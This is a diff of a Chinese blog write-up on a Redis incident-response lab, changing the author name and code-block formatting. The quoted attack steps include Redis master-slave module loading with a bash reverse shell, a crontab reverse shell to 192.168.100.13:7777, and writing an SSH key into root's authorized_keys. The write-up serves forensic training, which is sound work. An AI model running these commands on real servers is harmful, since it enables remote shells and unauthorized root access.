@@ -10,7 +10,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="日志分析-redis应急响应">
 <meta property="og:url" content="http://example.com/2025/04/08/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.html">
-<meta property="og:site_name" content="jujub3">
+<meta property="og:site_name" content="juju">
 <meta property="og:description" content="QAQ~">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744103548382-f7000f8a-b2ac-49e8-954a-6efd0bc65564.png">
@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://example.com/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744106183514-c85c3863-240d-4b98-9c0c-390b3d0a3959.png">
 <meta property="article:published_time" content="2025-04-08T11:53:44.000Z">
 <meta property="article:modified_time" content="2025-04-09T08:23:25.868Z">
-<meta property="article:author" content="jujub3">
+<meta property="article:author" content="juju">
 <meta property="article:tag" content="玄机">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744103548382-f7000f8a-b2ac-49e8-954a-6efd0bc65564.png">
@@ -147,7 +147,7 @@
 
     <div class="meta">
       <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">jujub3</span>
+        <span class="p-name" itemprop="name">juju</span>
       </span>
       
     <div class="postdate">
@@ -182,12 +182,8 @@
 <p>这里注意到加载了一个system模块。是从exp.so文件来的，很可能就是webshell</p>
 <p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744103806981-59a3c213-7cab-432e-b834-8f37ec7993e3.png" alt="img"></p>
 <p>而且redis也有利用主从复制getshell的攻击手法</p>
-<pre><code class="language-plain">config set dir /tmp/ //设置文件路径为/tmp/
-config set dbfilename exp.so //设置数据库文件名为：exp.so
-slaveof vpsip port //设置主redis地址为 vpsip，端口为 port
-module load /tmp/exp.so
-system.exec &#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp/ //设置文件路径为/tmp/</span><br><span class="line">config set dbfilename exp.so //设置数据库文件名为：exp.so</span><br><span class="line">slaveof vpsip port //设置主redis地址为 vpsip，端口为 port</span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">system.exec &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
 <p>首先连接靶机redis：redis-cli</p>
 <p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744104158603-c7f51a08-cbd8-4d33-8ffa-e7587f1b0d5e.png" alt="img"></p>
 <p>然后下载这个exp.so文件，放到云沙箱中进行分析：</p>
@@ -196,36 +192,16 @@ system.exec &#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;
 <p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744104958466-dcf997ac-082a-4780-86d4-318e895cfa73.png" alt="img"></p>
 <h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p> 通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;  </p>
 <p>同样redis的攻击手法里有利用crontab写入定时任务来反弹shell的手法</p>
-<pre><code class="language-plain">redis-cli -h 192.168.100.13 #连接
- 
-redis flushall #清除所有键值
- 
-config set dir /var/spool/cron/crontabs/ #设置保存路径
- 
-config set dbfilename shell #保存名称
- 
-set xz “\n * bash -i &gt;&amp; /dev/tcp/192.168.100.13/7777 0&gt;&amp;1\n” #将反弹shell写入xz键值
- 
-save #写入保存路径的shell文件
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.100.13 #连接</span><br><span class="line"> </span><br><span class="line">redis flushall #清除所有键值</span><br><span class="line"> </span><br><span class="line">config set dir /var/spool/cron/crontabs/ #设置保存路径</span><br><span class="line"> </span><br><span class="line">config set dbfilename shell #保存名称</span><br><span class="line"> </span><br><span class="line">set xz “\n * bash -i &gt;&amp; /dev/tcp/192.168.100.13/7777 0&gt;&amp;1\n” #将反弹shell写入xz键值</span><br><span class="line"> </span><br><span class="line">save #写入保存路径的shell文件</span><br></pre></td></tr></table></figure>
+
 <p>分析主机的定时任务表就能发现反弹shell的情况了：crontab -l</p>
 <p> 这是因为攻击者可能会利用定时任务（cron jobs）来保持对系统的持久访问，或者定时反弹一个 Shell 到攻击者的机器  </p>
 <p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744105310803-2e86b15a-a103-4209-8573-027e210bcbb9.png" alt="img"></p>
 <h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p> 通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交  </p>
 <p>同样，redis的攻击手法中也有利用ssh-keygen 公钥登录服务器的方式</p>
 <p>当redis以root身份运行，可以给root账户写入ssh公钥权限，直接通过ssh登录服务器，<br>在攻击机中申生成ssh公钥和私钥，密码设为空</p>
-<pre><code class="language-plain">ssh-keygen -t rsa
-进入.ssh目录:cd .ssh/ 将生成的公钥保存到1.txt
-(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt
-cat 1.txt | redis-cli -h [redis的ip] -x set crack
-redis-cli -h 192.168.157.129
-config set dir /root/.ssh       #	更改redis备份路径为ssh公钥存放目录（一般为/root/.ssh）
-config set dbfilename authorized_keys  #设置上传公钥的备份文件名字为authorized_keys
-config get dbfilename #检查是否更改成功 
-save      #保存 
-exit       #退出
-ssh -i id_rsa root@redis的IP   #在攻击机上使用ssh免密登录靶机
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">进入.ssh目录:cd .ssh/ 将生成的公钥保存到1.txt</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</span><br><span class="line">cat 1.txt | redis-cli -h [redis的ip] -x set crack</span><br><span class="line">redis-cli -h 192.168.157.129</span><br><span class="line">config set dir /root/.ssh       #	更改redis备份路径为ssh公钥存放目录（一般为/root/.ssh）</span><br><span class="line">config set dbfilename authorized_keys  #设置上传公钥的备份文件名字为authorized_keys</span><br><span class="line">config get dbfilename #检查是否更改成功 </span><br><span class="line">save      #保存 </span><br><span class="line">exit       #退出</span><br><span class="line">ssh -i id_rsa root@redis的IP   #在攻击机上使用ssh免密登录靶机</span><br></pre></td></tr></table></figure>
+
 <p>也就是说会向靶机上写入ssh密钥，我们查看一下靶机的&#x2F;root&#x2F;.ssh,确实有一个被写入的公钥authorized_keys</p>
 <p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744105584447-54b4717b-65ac-46d5-9c9c-255cad822358.png" alt="img">去github搜：flag{xj-test-user-wow-you-find-flag} </p>
 <p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744105871933-8f4c9bc8-e319-4fe1-b410-3a046fa2f009.png" alt="img"></p>
@@ -315,7 +291,7 @@ ssh -i id_rsa root@redis的IP   #在攻击机上使用ssh免密登录靶机
     
     
     2025
-    jujub3
+    juju
   </div>
   <div class="footer-right">
     <nav>
